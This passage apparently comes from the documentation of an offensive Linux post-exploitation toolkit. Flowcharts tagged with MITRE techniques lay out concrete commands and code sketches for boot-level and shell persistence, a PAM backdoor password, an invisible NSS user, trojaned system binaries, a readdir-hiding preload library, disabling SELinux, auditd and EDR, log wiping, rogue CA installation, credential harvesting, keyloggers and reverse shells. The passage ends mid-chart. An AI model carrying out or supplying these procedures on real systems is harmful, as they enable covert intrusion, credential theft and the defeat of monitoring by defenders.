    G --> H["Find init script in extracted rootfs"]
    H --> I["Inject insmod command<br>after shebang line (line 2)"]
    I --> J["Rebuild: find . | cpio -o -H newc | gzip"]
    J --> K["Write rebuilt initramfs to /boot/"]
    K --> L["Install postinst.d hook<br>for future kernel updates"]
    L --> M["dmesg -C (clear traces)"]
    M --> N["Module loads at boot<br>BEFORE root filesystem mounts"]

    style A fill:#ff4444,color:#fff
    style I fill:#ff0000,color:#fff
    style J fill:#ff8800,color:#fff
    style N fill:#44aa44,color:#fff
```

---

### 36 — Trap Command Persistence

**Script:** `scripts/trap_persist.sh` | **MITRE:** T1546.005  
**Purpose:** Abuse bash DEBUG/EXIT/ERR/RETURN traps for persistence, reverse shells, and keylogging.

```mermaid
flowchart TD
    A["trap_persist.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select trap type:<br>1. DEBUG (every command)<br>2. EXIT (shell close)<br>3. ERR (command failure)<br>4. RETURN (function return)"]
    C --> D["Select mode:<br>1. Reverse shell on trigger<br>2. Keylogger (capture commands)<br>3. Custom command"]
    D --> E{"Injection target"}
    E -->|Global| F["Write to /etc/profile.d/trap.sh"]
    E -->|Per-user| G["Append to ~/.bashrc"]
    F --> H["trap 'PAYLOAD' SIGNAL"]
    G --> H
    H --> I["Fires on every matching<br>bash event for all sessions"]

    style A fill:#ff4444,color:#fff
    style H fill:#ff8800,color:#fff
    style I fill:#44aa44,color:#fff
```

---

### 37 — Python Startup Hooks

**Script:** `scripts/python_persist.sh` | **MITRE:** T1546.018  
**Purpose:** Inject code into Python startup paths — fires whenever any Python interpreter starts.

```mermaid
flowchart TD
    A["python_persist.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select injection method:<br>1. .pth file (site-packages)<br>2. usercustomize.py<br>3. sitecustomize.py"]
    C --> D{"Method"}
    D -->|.pth| E["Find site-packages dir<br>Write .pth file:<br>import os; os.system('PAYLOAD')"]
    D -->|usercustomize| F["Write usercustomize.py<br>to site-packages with<br>subprocess.Popen(PAYLOAD)"]
    D -->|sitecustomize| G["Write sitecustomize.py<br>with import-time backdoor"]
    E --> H["Fires on every python/python3 invocation"]
    F --> H
    G --> H

    style A fill:#ff4444,color:#fff
    style E fill:#ff8800,color:#fff
    style F fill:#ff8800,color:#fff
    style G fill:#ff8800,color:#fff
    style H fill:#44aa44,color:#fff
```

---

### 41 — Systemd Timer Persistence

**Script:** `scripts/systemd_timer.sh` | **MITRE:** T1053.006  
**Purpose:** Create persistent systemd timer units with configurable intervals.

```mermaid
flowchart TD
    A["systemd_timer.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["read payload (default: revshell)"]
    C --> D["read timer name (default: system-update)"]
    D --> E["read interval (default: 5min)"]
    E --> F["Write /etc/systemd/system/NAME.service:<br>Type=oneshot<br>ExecStart=/bin/bash -c 'PAYLOAD'"]
    F --> G["Write /etc/systemd/system/NAME.timer:<br>OnBootSec=60<br>OnUnitActiveSec=INTERVAL<br>Persistent=true"]
    G --> H["systemctl daemon-reload"]
    H --> I["systemctl enable --now NAME.timer"]
    I --> J["Timer fires every INTERVAL<br>+ 60s after boot"]

    style A fill:#ff4444,color:#fff
    style F fill:#ff8800,color:#fff
    style G fill:#ff8800,color:#fff
    style J fill:#44aa44,color:#fff
```

---

### 46 — Bootkit / Bootloader Persistence

**Script:** `scripts/bootkit.sh` | **MITRE:** T1542.003  
**Purpose:** Inject payloads into GRUB2 bootloader config, EFI partition, or kernel parameters for pre-OS persistence.

```mermaid
flowchart TD
    A["bootkit.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Banner + BRICK WARNING"]
    C --> D["Select method:<br>1. GRUB custom menuentry<br>2. GRUB config backdoor<br>3. EFI partition backdoor<br>4. Kernel param injection<br>5. GRUB module persistence<br>6. Restore from backup"]

    D -->|1| E["grub_custom_inject()"]
    E --> E1["backup_grub()"]
    E1 --> E2["Append hidden menuentry<br>to /etc/grub.d/40_custom:<br>single-user / init=/bin/bash / custom"]
    E2 --> E3["update-grub"]

    D -->|2| F["grub_config_backdoor()"]
    F --> F1["backup_grub()"]
    F1 --> F2["Modify /etc/default/grub:<br>custom init=, disable timeout,<br>change default entry"]
    F2 --> F3["update-grub / grub2-mkconfig / grub-mkconfig"]

    D -->|3| G["efi_backdoor()"]
    G --> G1["Find ESP mount"]
    G1 --> G2["Drop startup.nsh OR<br>copy EFI binary OR<br>efibootmgr boot order manipulation"]

    D -->|4| H["kernel_param_inject()"]
    H --> H1["Inject into GRUB_CMDLINE_LINUX_DEFAULT:<br>init wrapper, disable security modules"]
    H1 --> H2["update-grub"]

    D -->|5| I["grub_module_persist()"]
    I --> I1["Create /etc/grub.d/01_d3m0n<br>insmod commands / pre-boot exec"]
    I1 --> I2["update-grub"]

    D -->|6| J["restore_bootkit()"]
    J --> J1["Restore from<br>/var/lib/.d3m0n_bootkit_bak"]

    style A fill:#ff4444,color:#fff
    style E2 fill:#ff0000,color:#fff
    style F2 fill:#ff0000,color:#fff
    style G2 fill:#ff0000,color:#fff
    style H1 fill:#ff0000,color:#fff
    style I1 fill:#ff0000,color:#fff
```

**Flow Details:**
1. Every mutation calls `backup_grub()` first for rollback capability
2. GRUB config changes require `update-grub` (or `grub2-mkconfig`/`grub-mkconfig` fallback chain)
3. EFI method directly manipulates the EFI System Partition
4. Kernel param injection can disable SELinux/AppArmor at boot via `security=`
5. Most dangerous technique — can brick the system if misconfigured

---

### 56 — D-Bus Service Persistence

**Script:** `scripts/dbus_persist.sh` | **MITRE:** T1543.002  
**Purpose:** Register system or session D-Bus activated services as on-demand IPC backdoor triggers.

```mermaid
flowchart TD
    A["dbus_persist.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select scope:<br>1. System bus<br>2. Session bus"]
    C --> D["read service name<br>(e.g. org.freedesktop.UpdateHelper)"]
    D --> E["read payload command"]
    E --> F{"System or Session?"}
    F -->|System| G["Write /usr/share/dbus-1/system-services/NAME.service<br>+ /etc/dbus-1/system.d/NAME.conf (policy)"]
    F -->|Session| H["Write /usr/share/dbus-1/services/NAME.service"]
    G --> I["systemd service unit:<br>ExecStart=PAYLOAD<br>BusName=NAME"]
    H --> I
    I --> J["dbus-send triggers activation<br>on first method call to bus name"]

    style A fill:#ff4444,color:#fff
    style G fill:#ff8800,color:#fff
    style H fill:#ff8800,color:#fff
    style J fill:#44aa44,color:#fff
```

---

### 60 — Kernel Parameter Abuse

**Script:** `scripts/kernel_exploit.sh` | **MITRE:** T1546  
**Purpose:** Abuse writable kernel parameters for code execution — `core_pattern`, `sysctl.conf`, `modprobe` path hijack.

```mermaid
flowchart TD
    A["kernel_exploit.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select method:<br>1. core_pattern pipe<br>2. sysctl.conf persistence<br>3. modprobe path hijack"]

    C -->|1| D["Write /proc/sys/kernel/core_pattern:<br>|/path/to/payload %p %u"]
    D --> D1["Trigger: cause a segfault<br>Kernel pipes core dump to payload"]

    C -->|2| E["Write to /etc/sysctl.conf:<br>kernel.core_pattern = |/path/payload"]
    E --> E1["sysctl -p<br>Persists across reboots"]

    C -->|3| F["Write /proc/sys/kernel/modprobe:<br>/path/to/payload"]
    F --> F1["Trigger: request unknown module<br>Kernel executes payload as modprobe"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff0000,color:#fff
    style E fill:#ff8800,color:#fff
    style F fill:#ff0000,color:#fff
```

---

## 2. Privilege Escalation

### 07 — Privileged User & SUID Bash

**Script:** `demonizedshell.sh` inline `userANDBashSUID()` | **MITRE:** T1548.001  
**Purpose:** Create a new user with sudo privileges and set SUID bit on `/bin/bash`.

```mermaid
flowchart TD
    A["userANDBashSUID()"] --> B["read username"]
    B --> C["adduser username"]
    C --> D["usermod -aG sudo username"]
    D --> E["chmod u+s /bin/bash"]
    E --> F["User has sudo access<br>AND bash -p gives root shell"]

    style A fill:#ff4444,color:#fff
    style C fill:#ff8800,color:#fff
    style E fill:#ff0000,color:#fff
    style F fill:#44aa44,color:#fff
```

**Flow Details:**
1. `adduser` creates the user (interactive prompts for password)
2. `usermod -aG sudo` grants sudo group membership
3. `chmod u+s /bin/bash` sets the SUID bit — any user can run `bash -p` for a root shell
4. SUID bash is system-wide — affects all users, not just the new one

---

### 11 — LD_PRELOAD PrivEsc

**Script:** `scripts/ld.sh` | **MITRE:** T1574.006  
**Purpose:** Configure `/etc/sudoers` to preserve `LD_PRELOAD` through sudo, enabling shared library injection for privilege escalation.

```mermaid
flowchart TD
    A["ld.sh"] --> B["Append to /etc/sudoers:<br>Defaults env_keep += LD_PRELOAD"]
    B --> C["read user (e.g. www-data)"]
    C --> D["Append to /etc/sudoers:<br>USER ALL=(ALL:ALL) NOPASSWD: /usr/bin/find"]
    D --> E["PrivEsc path:<br>1. Write malicious .so (spawn shell)<br>2. sudo LD_PRELOAD=evil.so find<br>3. .so's constructor runs as root"]

    style A fill:#ff4444,color:#fff
    style B fill:#ff0000,color:#fff
    style D fill:#ff0000,color:#fff
    style E fill:#44aa44,color:#fff
```

---

### 51 — Linux Capabilities Abuse

**Script:** `scripts/caps_abuse.sh` | **MITRE:** T1548  
**Purpose:** Set dangerous Linux capabilities on binaries and scan for existing capability misconfigurations.

```mermaid
flowchart TD
    A["caps_abuse.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select mode:<br>1. Set cap_setuid on binary<br>2. Set cap_dac_read_search<br>3. Set cap_net_raw<br>4. Set cap_sys_admin<br>5. Scan for cap misconfigurations"]

    C -->|1| D["setcap cap_setuid+ep /path/to/binary<br>Binary can now setuid(0) → root"]
    C -->|2| E["setcap cap_dac_read_search+ep /path<br>Binary can read any file"]
    C -->|3| F["setcap cap_net_raw+ep /path<br>Binary can use raw sockets"]
    C -->|4| G["setcap cap_sys_admin+ep /path<br>Binary gets sysadmin capabilities"]
    C -->|5| H["getcap -r / 2>/dev/null<br>List all binaries with capabilities"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff0000,color:#fff
    style E fill:#ff0000,color:#fff
    style G fill:#ff0000,color:#fff
```

---

### 52 — PATH Variable Hijacking

**Script:** `scripts/path_hijack.sh` | **MITRE:** T1574.007  
**Purpose:** Create trojaned wrappers for `sudo`, `su`, `ssh`, `passwd` that capture credentials before calling the real binary.

```mermaid
flowchart TD
    A["path_hijack.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select target:<br>1. sudo wrapper<br>2. su wrapper<br>3. ssh wrapper<br>4. passwd wrapper"]
    C --> D["Create wrapper script in /usr/local/sbin/:<br>#!/bin/bash<br>echo $(date) COMMAND $@ >> /var/tmp/.creds<br>read -sp 'Password: ' pw<br>echo $(date) PASSWORD $pw >> /var/tmp/.creds<br>exec /usr/bin/REAL_COMMAND $@"]
    D --> E["chmod +x wrapper"]
    E --> F["Optionally inject into /etc/profile.d/:<br>export PATH=/usr/local/sbin:$PATH"]
    F --> G["Credentials logged to /var/tmp/.creds<br>Real command still executes normally"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff0000,color:#fff
    style F fill:#ff8800,color:#fff
    style G fill:#44aa44,color:#fff
```

---

### 58 — Library RPATH/ldconfig Poisoning

**Script:** `scripts/ldconfig_poison.sh` | **MITRE:** T1574.008  
**Purpose:** Exploit RPATH, ldconfig cache injection, and `LD_AUDIT` for shared library hijacking.

```mermaid
flowchart TD
    A["ldconfig_poison.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select method:<br>1. RPATH exploitation<br>2. ldconfig cache injection<br>3. LD_AUDIT dynamic linker hook"]

    C -->|1| D["Find binaries with RPATH set<br>readelf -d binary | grep RPATH<br>Place malicious .so in RPATH dir"]

    C -->|2| E["Write malicious .so to /usr/local/lib/<br>Add /usr/local/lib/ to /etc/ld.so.conf.d/<br>Run ldconfig to rebuild cache"]

    C -->|3| F["Write auditing .so implementing<br>la_version() + la_objsearch()<br>Set LD_AUDIT=/path/to/audit.so<br>in /etc/profile.d/"]

    D --> G["Hijacked library loads on<br>next binary execution"]
    E --> G
    F --> G

    style A fill:#ff4444,color:#fff
    style D fill:#ff0000,color:#fff
    style E fill:#ff0000,color:#fff
    style F fill:#ff0000,color:#fff
```

---

## 3. Defense Evasion

### 12 — Anti-Reversing Technique

**Script:** `demonizedshell.sh` inline `AntirevTechnique()` | **MITRE:** T1027  
**Purpose:** Overwrite ELF section headers with null bytes to break static analysis tools like `readelf`, `objdump`, `IDA`.

```mermaid
flowchart TD
    A["AntirevTechnique()"] --> B["git clone NullSection"]
    B --> C["gcc nullsection.c -o nullsection"]
    C --> D["./nullsection TARGET_ELF"]
    D --> E["Reads ELF header → finds<br>e_shoff (section header offset)"]
    E --> F["Overwrites section headers<br>with null bytes (\\x00)"]
    F --> G["ELF still executes normally<br>but objdump/readelf/IDA fail"]

    style A fill:#ff4444,color:#fff
    style F fill:#ff8800,color:#fff
    style G fill:#44aa44,color:#fff
```

---

### 28 — Process Hiding via Bind Mount

**Script:** `scripts/bindmount_hide.sh` | **MITRE:** T1564.001  
**Purpose:** Use `mount --bind` to overlay `/proc/PID` with an empty directory, hiding processes from `ps`, `top`, and `/proc` enumeration.

```mermaid
flowchart TD
    A["bindmount_hide.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select mode:<br>1. Hide PID<br>2. Persistent hiding<br>3. Unhide PID"]

    C -->|1| D["read target_pid"]
    D --> D1{"/proc/PID exists?"}
    D1 -->|No| Z2["Exit"]
    D1 -->|Yes| D2["mkdir /tmp/.decoy_proc_$$"]
    D2 --> D3["mount --bind DECOY /proc/PID"]
    D3 --> D4["PID invisible to ps/top"]

    C -->|2| E["read target_pid"]
    E --> E1["mkdir /var/tmp/.proc_decoy"]
    E1 --> E2{"Persist method?"}
    E2 -->|a| E3["Append to /etc/fstab:<br>DECOY /proc/PID none bind 0 0"]
    E2 -->|b| E4["Create systemd .mount unit"]
    E2 -->|c| E5["Insert into /etc/rc.local"]

    C -->|3| F["umount /proc/PID"]
    F --> F1["Clean fstab + systemd entries"]

    style A fill:#ff4444,color:#fff
    style D3 fill:#ff8800,color:#fff
    style E3 fill:#ff8800,color:#fff
```

---

### 29 — Hidepid /proc Mount

**Script:** `scripts/hidepid.sh` | **MITRE:** T1564.001  
**Purpose:** Remount `/proc` with `hidepid=2` so non-root users cannot see other users' processes.

```mermaid
flowchart TD
    A["hidepid.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select level:<br>1. hidepid=1 (limited info)<br>2. hidepid=2 (full hiding)<br>3. hidepid=0 (revert)"]
    C --> D["mount -o remount,hidepid=N /proc"]
    D --> E{"Make persistent?"}
    E -->|Yes| F["Remove old hidepid from /etc/fstab<br>Add: proc /proc proc defaults,hidepid=N 0 0"]
    E -->|No| G["Temporary only"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff8800,color:#fff
    style F fill:#ff8800,color:#fff
```

---

### 32 — Depmod Stealth

**Script:** `scripts/depmod_stealth.sh` | **MITRE:** T1014  
**Purpose:** Remove kernel module from human-readable `modules.dep` while preserving it in the binary trie (`modules.dep.bin`) that `modprobe` actually reads.

```mermaid
flowchart TD
    A["depmod_stealth.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select operation:<br>1. Hide module<br>2. List modules<br>3. Protect from depmod rebuild"]

    C -->|1| D["read module name"]
    D --> D1["Backup modules.dep.bin"]
    D1 --> D2["sed -i remove /modname.ko/ from:<br>modules.dep<br>modules.alias<br>modules.symbols"]
    D2 --> D3["modules.dep.bin untouched<br>modprobe still works"]

    C -->|3| E["read module name"]
    E --> E1["Create /usr/local/sbin/depmod-stealth-NAME<br>(re-hides after any depmod run)"]
    E1 --> E2["Install kernel postinst.d hook"]
    E2 --> E3["Create cron job: every 5 min<br>re-execute stealth script"]

    style A fill:#ff4444,color:#fff
    style D2 fill:#ff8800,color:#fff
    style E3 fill:#ff8800,color:#fff
```

---

### 39 — Binary Trojanization

**Script:** `scripts/binary_replace.sh` | **MITRE:** T1554  
**Purpose:** Replace system binaries (`ls`, `ps`, `netstat`, `ss`, `find`, `lsof`, `who`, `w`, `last`) with filtering wrappers that hide attacker activity.

```mermaid
flowchart TD
    A["binary_replace.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select target binary:<br>ls, ps, netstat, ss, find,<br>lsof, who, w, last"]
    C --> D["Backup original:<br>cp /usr/bin/TARGET /usr/bin/.TARGET.orig"]
    D --> E["Write wrapper script as /usr/bin/TARGET:<br>#!/bin/bash<br>Execute .TARGET.orig $@<br>| grep -v 'PATTERN_TO_HIDE'"]
    E --> F["chmod +x wrapper<br>Match original permissions"]
    F --> G["Binary now filters out<br>attacker PIDs/files/connections"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff0000,color:#fff
    style G fill:#44aa44,color:#fff
```

---

### 40 — System-Wide ld.so.preload

**Script:** `scripts/ldso_preload.sh` | **MITRE:** T1574.006  
**Purpose:** Compile a shared library hooking `readdir()` and inject it system-wide via `/etc/ld.so.preload`.

```mermaid
flowchart TD
    A["ldso_preload.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["read pattern to hide<br>(process name, file prefix, etc.)"]
    C --> D["Write C source (heredoc):<br>Hooks readdir()/readdir64()<br>via dlsym(RTLD_NEXT, 'readdir')<br>Filters entries matching pattern"]
    D --> E["gcc -shared -fPIC -o /lib/libsystem.so<br>-ldl source.c"]
    E --> F["echo /lib/libsystem.so<br>>> /etc/ld.so.preload"]
    F --> G["Every process on the system<br>now loads the hooking library<br>Files/processes matching pattern are hidden"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff0000,color:#fff
    style F fill:#ff0000,color:#fff
    style G fill:#44aa44,color:#fff
```

---

### 42 — Impair Defenses

**Script:** `scripts/defense_impair.sh` | **MITRE:** T1562  
**Purpose:** Disable/neuter security controls — SELinux, AppArmor, auditd, bash history, firewall, syslog, and EDR agents.

```mermaid
flowchart TD
    A["defense_impair.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Banner + menu"]
    C --> D["Select target:<br>1. SELinux<br>2. AppArmor<br>3. auditd<br>4. Bash history<br>5. Firewall<br>6. Syslog/journald<br>7. EDR/monitoring agents<br>8. Restore all"]

    D -->|1| E1["setenforce 0<br>sed SELINUX=disabled in config"]
    D -->|2| E2["aa-complain all profiles<br>systemctl stop/disable apparmor"]
    D -->|3| E3["auditctl -D (clear rules)<br>auditctl -e 0 (disable)<br>systemctl stop auditd"]
    D -->|4| E4["unset HISTFILE<br>HISTSIZE=0, set +o history<br>ln -sf /dev/null ~/.bash_history"]
    D -->|5| E5["iptables -F, nft flush<br>ufw disable, stop firewalld"]
    D -->|6| E6["Stop rsyslog/syslog-ng<br>journald → volatile, 8M max, 1h retention"]
    D -->|7| E7["pgrep EDR process list<br>(falcon-sensor, ossec, wazuh, etc.)<br>kill -9 + systemctl disable"]
    D -->|8| E8["Restore from /var/lib/.d3m0n_defense_bak"]

    style A fill:#ff4444,color:#fff
    style E1 fill:#ff0000,color:#fff
    style E3 fill:#ff0000,color:#fff
    style E7 fill:#ff0000,color:#fff
```

---

### 43 — Anti-Forensics / Indicator Removal

**Script:** `scripts/anti_forensics.sh` | **MITRE:** T1070  
**Purpose:** Timestomping, log wiping, history destruction, secure deletion, persistence trace cleanup, and metadata scrubbing.

```mermaid
flowchart TD
    A["anti_forensics.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select operation:<br>1. Timestomp files<br>2. Wipe system logs<br>3. Destroy shell history<br>4. Secure delete files<br>5. Clean persistence traces<br>6. Scrub file metadata"]

    C -->|1| D1["touch -r REFERENCE TARGET<br>Copy timestamps from legit file"]
    C -->|2| D2["Truncate /var/log/*<br>journalctl --vacuum-time=1s<br>Clear wtmp/btmp/utmp/lastlog"]
    C -->|3| D3["rm/shred ~/.bash_history for all users<br>ln -sf /dev/null ~/.bash_history<br>unset HISTFILE globally"]
    C -->|4| D4["shred -vfz -n 7 TARGET<br>Or dd if=/dev/urandom | overwrite"]
    C -->|5| D5["Remove crontab entries, systemd units,<br>udev rules, init.d scripts matching patterns"]
    C -->|6| D6["exiftool -all= FILE<br>mat2 FILE (metadata stripper)"]

    style A fill:#ff4444,color:#fff
    style D2 fill:#ff0000,color:#fff
    style D4 fill:#ff0000,color:#fff
```

---

### 44 — Rogue Certificate Authority

**Script:** `scripts/rogue_ca.sh` | **MITRE:** T1553.004  
**Purpose:** Generate and install a rogue CA certificate into the system trust store, then issue leaf certificates for arbitrary domains.

```mermaid
flowchart TD
    A["rogue_ca.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select operation:<br>1. Generate rogue CA<br>2. Install CA to trust store<br>3. Issue leaf cert for domain<br>4. Remove rogue CA"]

    C -->|1| D["openssl genrsa -out ca.key 4096<br>openssl req -x509 -new -nodes<br>-key ca.key -sha256 -days 3650<br>-subj '/CN=System Root CA'<br>-out ca.crt"]
    C -->|2| E["cp ca.crt /usr/local/share/ca-certificates/<br>update-ca-certificates"]
    C -->|3| F["openssl genrsa -out domain.key 2048<br>openssl req -new -key domain.key<br>openssl x509 -req -CA ca.crt -CAkey ca.key<br>-out domain.crt -days 365"]
    C -->|4| G["rm cert from ca-certificates/<br>update-ca-certificates --fresh"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff8800,color:#fff
    style E fill:#ff0000,color:#fff
    style F fill:#ff8800,color:#fff
```

---

### 54 — VM / Sandbox Evasion

**Script:** `scripts/vm_evasion.sh` | **MITRE:** T1497  
**Purpose:** Detect virtual machines, containers, debuggers, and monitoring tools to decide whether to execute or abort.

```mermaid
flowchart TD
    A["vm_evasion.sh"] --> B["Select check:<br>1. Hypervisor detection<br>2. Container detection<br>3. Debugger detection<br>4. Monitoring tool detection<br>5. Hardware anomaly check<br>6. Run all checks"]

    B -->|1| C["Check DMI: dmidecode | grep -i virtual<br>Check CPUID: cpuid hypervisor flag<br>Check MAC prefix: 00:0C:29, 00:50:56, 52:54:00<br>Check /sys/class/dmi/id/*"]
    B -->|2| D["Check /.dockerenv<br>Check /proc/1/cgroup for docker/lxc/kubepods<br>Check /proc/vz vs /proc/bc<br>Check CONTAINER env var"]
    B -->|3| E["ptrace(PTRACE_TRACEME) == -1 → debugger<br>Check /proc/self/status TracerPid<br>Check LD_PRELOAD for hooks"]
    B -->|4| F["pgrep for: strace, ltrace, gdb,<br>tcpdump, wireshark, auditd"]
    B -->|5| G["Check CPU count < 2<br>Check RAM < 2GB<br>Check disk < 50GB<br>Check uptime < 10min"]

    C --> H{"Detected?"}
    D --> H
    E --> H
    F --> H
    G --> H
    H -->|Yes| I["ABORT: Likely sandboxed"]
    H -->|No| J["SAFE: Proceed with execution"]

    style A fill:#ff4444,color:#fff
    style I fill:#ff0000,color:#fff
    style J fill:#44aa44,color:#fff
```

---

## 4. Credential Access

### 21 — PAM Backdoor

**Script:** `scripts/pam.sh` | **MITRE:** T1556.003  
**Purpose:** Compile and inject a PAM module that accepts a universal backdoor password for any user.

```mermaid
flowchart TD
    A["pam.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C{"gcc available?<br>pam headers present?"}
    C -->|No| Z2["Exit: install gcc + libpam0g-dev"]
    C -->|Yes| D["read backdoor_password"]
    D --> E["Write C source heredoc:<br>#include #lt;security/pam_modules.h#gt;<br>pam_sm_authenticate:<br>  if strcmp password BACKDOOR == 0<br>    return PAM_SUCCESS<br>  return PAM_AUTH_ERR"]
    E --> F["sed substitute PASSWORD placeholder"]
    F --> G{"Detect PAM directory:<br>/lib/x86_64-linux-gnu/security/<br>/lib/security/<br>/lib64/security/"}
    G --> H["gcc -shared -fPIC -o pam_backdoor.so"]
    H --> I["cp pam_backdoor.so to PAM dir"]
    I --> J["Backup common-auth or sshd PAM config"]
    J --> K["Inject before pam_unix.so:<br>auth sufficient pam_backdoor.so"]
    K --> L["Cleanup: remove .c source"]
    L --> M["Any user can now login<br>with the backdoor password"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff8800,color:#fff
    style H fill:#ff8800,color:#fff
    style K fill:#ff0000,color:#fff
    style M fill:#44aa44,color:#fff
```

---

### 47 — Credential Harvester

**Script:** `scripts/cred_harvest.sh` | **MITRE:** T1552  
**Purpose:** Multi-source credential extraction — shadow, SSH keys, history, environment, config files, databases, process memory.

```mermaid
flowchart TD
    A["cred_harvest.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select source:<br>1. /etc/shadow dump<br>2. SSH private keys<br>3. History password grep<br>4. /proc/*/environ scan<br>5. Config file creds<br>6. Database credentials<br>7. Process memory secrets"]

    C -->|1| D1["cat /etc/shadow<br>Extract hash fields"]
    C -->|2| D2["find / -name id_rsa -o -name id_ed25519<br>Copy to loot directory"]
    C -->|3| D3["grep -rih 'password\\|passwd\\|pass='<br>~/.bash_history ~/.mysql_history"]
    C -->|4| D4["for pid in /proc/*/environ;<br>grep -z PASSWORD\\|SECRET\\|TOKEN"]
    C -->|5| D5["Search: wp-config.php,<br>.env, settings.py,<br>config.yml, .git-credentials"]
    C -->|6| D6["MySQL: ~/.my.cnf<br>PostgreSQL: ~/.pgpass<br>MongoDB: mongod.conf"]
    C -->|7| D7["gcore PID → strings core.PID<br>| grep password\\|token"]

    D1 --> E["Save to loot directory"]
    D2 --> E
    D3 --> E
    D4 --> E
    D5 --> E
    D6 --> E
    D7 --> E

    style A fill:#ff4444,color:#fff
    style D1 fill:#ff0000,color:#fff
    style D7 fill:#ff0000,color:#fff
```

---

### 48 — Linux Keylogger

**Script:** `scripts/keylogger.sh` | **MITRE:** T1056.001  
**Purpose:** Capture keystrokes via multiple methods — TTY, X11, PAM, strace, and systemd daemon.

```mermaid
flowchart TD
    A["keylogger.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select method:<br>1. TTY capture (script command)<br>2. X11 xinput logging<br>3. PAM credential logging<br>4. strace stdin capture<br>5. systemd keylogger daemon"]

    C -->|1| D1["script -q -t /var/tmp/.tty_log<br>Captures all terminal I/O"]
    C -->|2| D2["xinput list → find keyboard ID<br>xinput test ID | tee logfile<br>Captures X11 keystrokes"]
    C -->|3| D3["PAM module logs credentials<br>to hidden file on every auth"]
    C -->|4| D4["strace -p PID -e read<br>-s 1024 2#gt;#amp;1 pipe grep read 0<br>Captures stdin of target process"]
    C -->|5| D5["Create systemd service:<br>ExecStart=script/strace-based<br>keylogger running as daemon"]

    style A fill:#ff4444,color:#fff
    style D2 fill:#ff8800,color:#fff
    style D3 fill:#ff0000,color:#fff
    style D4 fill:#ff8800,color:#fff
```

---

### 57 — NSS Module Backdoor

**Script:** `scripts/nss_backdoor.sh` | **MITRE:** T1556  
**Purpose:** Compile and register a Name Service Switch module that resolves invisible users — operates below PAM.

```mermaid
flowchart TD
    A["nss_backdoor.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select operation:<br>1. Install<br>2. Status check<br>3. Cleanup"]

    C -->|1| D["read username, password, UID, home, shell"]
    D --> E["Generate SHA-512 hash:<br>openssl passwd -6 PASSWORD<br>fallback: python3 crypt"]
    E --> F["Write C source (heredoc):<br>_nss_d3m0n_getpwnam_r():<br>  if name == USERNAME → fill passwd struct<br>_nss_d3m0n_getspnam_r():<br>  if name == USERNAME → fill spwd struct"]
    F --> G["gcc -shared -fPIC -Wl,-soname,libnss_d3m0n.so.2<br>-o libnss_d3m0n.so.2"]
    G --> H["cp to /lib/x86_64-linux-gnu/<br>Create symlinks"]
    H --> I["Backup /etc/nsswitch.conf"]
    I --> J["sed inject 'd3m0n' before 'files'/'compat'<br>in passwd: and shadow: lines"]
    J --> K["ldconfig"]
    K --> L["getent passwd USERNAME → resolves<br>su USERNAME → works<br>User invisible in /etc/passwd"]

    C -->|2| M["Check library exists<br>grep nsswitch.conf<br>Test: getent passwd USERNAME"]
    C -->|3| N["Restore nsswitch.conf from backup<br>Remove .so files<br>ldconfig"]

    style A fill:#ff4444,color:#fff
    style F fill:#ff8800,color:#fff
    style J fill:#ff0000,color:#fff
    style L fill:#44aa44,color:#fff
```

---

## 5. Execution

### 09 — ICMP Backdoor

**Script:** `demonizedshell.sh` inline `icmpBackdoor()` | **MITRE:** T1095  
**Purpose:** Compile and deploy Pingoor — an ICMP-triggered backdoor using raw sockets.

```mermaid
flowchart TD
    A["icmpBackdoor()"] --> B["read LHOST (callback IP)"]
    B --> C["read LPORT (callback port)"]
    C --> D["git clone Pingoor"]
    D --> E["make HOST=LHOST PORT=LPORT"]
    E --> F["Binary compiled at Pingoor/pingoor"]
    F --> G["Deploy: ./pingoor<br>Listens for ICMP packets<br>Authenticated ping triggers<br>reverse shell to LHOST:LPORT"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff8800,color:#fff
    style G fill:#44aa44,color:#fff
```

---

### 17 — Reverse Shell with Custom Process Name

**Script:** `scripts/procname.sh` | **MITRE:** T1036.004  
**Purpose:** Spawn a reverse shell with a user-specified process name for stealth.

```mermaid
flowchart TD
    A["procname.sh"] --> B["read process name"]
    B --> C["read IP"]
    C --> D["read PORT"]
